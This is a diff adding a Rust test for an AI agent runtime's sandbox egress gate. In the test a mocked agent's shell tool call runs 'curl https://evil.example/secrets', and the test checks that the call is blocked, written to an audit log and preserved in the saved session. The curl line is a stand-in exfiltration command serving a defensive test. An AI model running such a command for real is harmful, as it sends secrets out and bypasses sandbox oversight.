@@ -1563,3 +1563,154 @@ async fn sigkill_then_resume_recovers_partial_state_and_advances_to_done() {
         "Crash recovery_log entry should survive resume's re-save"
     );
 }
+
+// ---------- §11 sandbox egress mechanical gate ----------
+
+/// Spec §11 acceptance gate: a `shell` tool call that tries `curl
+/// evil.example` under the default deny-all-egress policy must (a) be
+/// refused, (b) leave a single audit row on disk with the destination
+/// and the originating tool_call_id, and (c) leave the session file
+/// itself in a shape that survives `OnDiskSession::load_from` (the
+/// load is the same validator the resume path runs through, so this
+/// is the closest we get to "schema validation" without bringing
+/// jsonschema-rs into the Rust gate).
+///
+/// The dispatch surface here uses `MockAdapter`'s scripted-tool-call
+/// path; production goes through the same `Dispatcher::dispatch` for
+/// every tool, so this test pins the producer end-to-end.
+#[tokio::test]
+async fn shell_curl_evil_example_is_blocked_and_audited() {
+    use atelier_core::EgressEvent;
+
+    let workspace = tempfile::TempDir::new().unwrap();
+
+    let curl_call = ToolCallRequest {
+        id: "tc-curl-evil".into(),
+        name: "shell".into(),
+        arguments: serde_json::json!({
+            "command": "curl https://evil.example/secrets"
+        }),
+    };
+    let responses = vec![
+        MockResponse {
+            assistant_text: "trying curl".into(),
+            tool_calls: vec![curl_call],
+        },
+        MockResponse {
+            assistant_text: "blocked, calling it done".into(),
+            tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
+        },
+    ];
+
+    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
+    let runner = Runner::new(
+        workspace.path().to_path_buf(),
+        ProviderChoice::Mock { responses },
+        EventSink::Capture(events.clone()),
+    )
+    .expect("mock runner construction is infallible")
+    .with_max_turns(4);
+
+    let report = runner
+        .run("trigger egress".into())
+        .await
+        .expect("run should not error wholesale on a §11 block");
+
+    // The §11 block is a per-tool-call failure; the run as a whole
+    // can still reach Done if a later turn declares `claimed_done`.
+    assert_eq!(report.final_state, State::Done);
+
+    // (a) The session directory hosts an `audit.log` with exactly one
+    //     newline-delimited JSON row, parseable as an `EgressEvent`.
+    let session_dir: PathBuf = workspace
+        .path()
+        .join(".atelier")
+        .join("sessions")
+        .join(report.session_id.0.to_string());
+    let audit_path = session_dir.join("audit.log");
+    assert!(
+        audit_path.exists(),
+        "expected audit.log at {audit_path:?}; \
+         session_dir contents: {:?}",
+        std::fs::read_dir(&session_dir)
+            .map(|it| it.flatten().map(|e| e.file_name()).collect::<Vec<_>>())
+            .ok()
+    );
+    let body = std::fs::read_to_string(&audit_path).unwrap();
+    let lines: Vec<&str> = body.lines().collect();
+    assert_eq!(
+        lines.len(),
+        1,
+        "expected exactly one audit row, got {body:?}"
+    );
+
+    let parsed: EgressEvent = serde_json::from_str(lines[0]).expect("audit row must be valid JSON");
+    assert_eq!(parsed.version, 1);
+    assert_eq!(parsed.kind, "subprocess-egress");
+    assert_eq!(
+        parsed.tool_call_id, "tc-curl-evil",
+        "audit row must point at the originating ToolCallRequest::id"
+    );
+    assert_eq!(parsed.tool_name, "shell");
+    assert_eq!(parsed.destination, "evil.example");
+    assert_eq!(parsed.outcome, "blocked");
+    assert_eq!(parsed.reason, "sandbox-deny-net");
+    assert!(
+        parsed.timestamp.ends_with('Z') && parsed.timestamp.len() == 20,
+        "RFC 3339 second-precision Z-suffix expected, got {:?}",
+        parsed.timestamp
+    );
+
+    // (b) The shell dispatch result was fed back into the next turn
+    //     as a Role::Tool message — the error payload names the
+    //     SandboxViolation. The bus carries that as a
+    //     MessageCommitted with role=Tool. We pin the wire-string
+    //     shape so a future refactor of the tool-error → message
+    //     translation can't silently drop the failure mode.
+    let captured = events.lock();
+    let tool_results: Vec<String> = captured
+        .iter()
+        .filter_map(|e| match e {
+            Event::MessageCommitted { role, text }
+                if *role == atelier_core::session::MessageRole::Tool =>
+            {
+                Some(text.clone())
+            }
+            _ => None,
+        })
+        .collect();
+    assert!(
+        tool_results
+            .iter()
+            .any(|t| t.contains("evil.example") && t.to_lowercase().contains("sandbox")),
+        "expected a Tool message describing the egress block; got {tool_results:?}"
+    );
+
+    // (c) session.json round-trips through OnDiskSession::load_from —
+    //     the same validator the §14 resume path runs.
+    drop(captured);
+    let session_file = session_dir.join("session.json");
+    assert!(
+        session_file.exists(),
+        "session.json missing at {session_file:?}"
+    );
+    let on_disk = atelier_core::OnDiskSession::load_from(&session_dir)
+        .expect("session.json must round-trip via OnDiskSession::load_from");
+    // The conversation log preserved the offending tool_call_id so an
+    // auditor can correlate the audit row back to the model turn that
+    // emitted it.
+    let preserved = on_disk.conversation.iter().any(|row| {
+        row.get("tool_calls")
+            .and_then(|v| v.as_array())
+            .map(|arr| {
+                arr.iter().any(|tc| {
+                    tc.get("tool_call_id").and_then(|v| v.as_str()) == Some("tc-curl-evil")
+                })
+            })
+            .unwrap_or(false)
+    });
+    assert!(
+        preserved,
+        "tc-curl-evil should appear in the persisted conversation tool_calls"
+    );
+}
